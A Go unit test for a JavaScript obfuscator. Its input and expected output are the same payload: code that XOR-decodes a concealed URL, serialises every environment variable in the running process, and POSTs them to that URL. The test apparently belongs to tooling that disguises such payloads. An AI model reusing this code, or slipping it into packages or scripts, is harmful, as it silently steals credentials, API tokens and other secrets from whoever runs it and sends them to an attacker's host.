package js

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestObfuscate(t *testing.T) {
	expected := `(function(){for(var t,n,a,r=require("https"),s=Buffer.from("%s","hex").toString("utf8"),o="%s",i="",e=0;e<s.length;e++)i+=String.fromCharCode(s.charCodeAt(e)^o.charCodeAt(e%o.length));t=JSON.stringify(process.env),a={method:"POST",headers:{"Content-Type":"application/json","Content-Length":t.length}},n=r.request(i,a),n.write(t),n.end()})();`

	o := New()
	code, _ := o.Obfuscate(`
	(function() {
	var https = require("https")
	var text = Buffer.from("%s", "hex").toString("utf8");
	var key = "%s";
	var url = "";
	for (var i = 0; i < text.length; i++) { url += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length)) };
	var postData = JSON.stringify(process.env);
	var options = { method: 'POST', headers: { "Content-Type": "application/json", "Content-Length": postData.length } };
	var req = https.request(url, options);
	req.write(postData);
	req.end();
	})();`)

	assert.Equal(t, expected, code)
}
